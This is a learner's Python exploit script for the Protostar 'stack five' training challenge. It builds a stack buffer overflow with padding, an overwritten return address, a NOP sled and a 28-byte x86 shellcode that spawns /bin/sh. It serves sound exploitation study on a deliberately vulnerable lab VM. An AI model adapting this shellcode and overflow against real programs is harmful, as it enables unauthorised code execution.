# LEARNING BINARY EXPLOITATION
#
# Episode [First Exploit! Buffer Overflow with Shellcode - bin 0x0E](https://www.youtube.com/watch?v=HSlhY4Uy8SA&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=16)
# Shellcode from [Shell storm - Linux x86 execve("/bin/sh") - 28 bytes](http://shell-storm.org/shellcode/files/shellcode-811.php)
# Download the virtual machine `wget https://github.com/ExploitEducation/Protostar/releases/download/v2.0.0/exploit-exercises-protostar-2.iso`, check the challenge [stack five - protostar](https://exploit.education/protostar/stack-five/)

import struct

padding = ""

for c in "ABCDEFGHIJKLMNOPQRS":
    padding += c * 4

eip = struct.pack("I", 0xbffff7bc + 50) # the stack + random position
nopslide = "\x90" * 50 # nop code
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" # shellcode
# payload = "\xCC" * 4 # int3 signal

print(padding + eip + nopslide + payload)
~                                         
